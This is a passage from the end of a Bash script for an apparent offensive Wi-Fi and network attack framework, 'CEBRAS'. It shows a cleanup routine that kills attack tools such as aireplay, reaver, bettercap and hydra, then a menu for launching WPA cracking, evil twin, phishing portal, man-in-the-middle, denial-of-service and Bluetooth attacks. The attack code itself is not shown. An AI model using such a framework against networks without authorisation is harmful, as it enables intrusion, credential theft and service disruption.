    # Kill attack processes
    pkill -f "xterm.*CEBRAS"
    pkill -f hostapd
    pkill -f dnsmasq
    pkill -f aireplay
    pkill -f mdk4
    pkill -f reaver
    pkill -f bettercap
    pkill -f beef
    pkill -f setoolkit
    pkill -f wifiphisher
    pkill -f fluxion
    pkill -f hashcat
    pkill -f hydra
    pkill -f sqlmap
    pkill -f msfconsole
    
    # Return to managed mode
    airmon-ng stop $MON_IFACE 2>/dev/null
    systemctl restart NetworkManager
    
    # Clear session
    rm -f $SESSION_FILE
    
    echo -e "${GREEN}[✓] All attacks stopped. Network restored.${NC}"
}

# ============================================================================
# MAIN MENU
# ============================================================================

main_menu() {
    while true; do
        clear
        show_banner
        echo -e "${WHITE}════════════════════════════════════════════════════════════════════${NC}"
        echo -e "${WHITE}                     CEBRAS MAIN MENU                               ${NC}"
        echo -e "${WHITE}════════════════════════════════════════════════════════════════════${NC}"
        echo ""
        echo -e "${CYAN}Select attack category to LAUNCH:${NC}"
        echo ""
        echo "1.  WPA/WPA2/WPA3 Cracking"
        echo "2.  Evil Twin Attacks"
        echo "3.  Phishing Portals"
        echo "4.  Man-in-the-Middle Attacks"
        echo "5.  Denial of Service Attacks"
        echo "6.  Bluetooth Attacks"
        echo "7.  Wired Network Attacks"
        echo "8.  Automated Full Assessment"
        echo "9.  Cleanup/Stop All Attacks"
        echo "10. Exit CEBRAS"
        echo ""
        echo -e "${YELLOW}Interface: $MON_IFACE${NC}"
        echo ""
        read -p "CEBRAS> " main_choice
        
        case $main_choice in
            1) wpa_attacks ;;
            2) evil_twin_attacks ;;
            3) phishing_attacks ;;
            4) mitm_attacks ;;
            5) dos_attacks ;;
            6) bluetooth_attacks ;;
            7) wired_attacks ;;
            8) automated_assessment ;;
            9) cleanup_attacks ;;
            10)
                cleanup_attacks
                echo -e "${GREEN}[+] CEBRAS Framework terminated. Stay ethical!${NC}"
                exit 0
                ;;
            *)
                echo -e "${RED}[!] Invalid selection${NC}"
                sleep 1
                ;;
        esac
        
        echo ""
        echo -e "${YELLOW}[*] Press Enter to return to menu...${NC}"
        read
    done
}

# ============================================================================
# INITIALIZATION
# ============================================================================

# Start CEBRAS
check_root
legal_agreement
check_and_install_tools
configure_interfaces
main_menu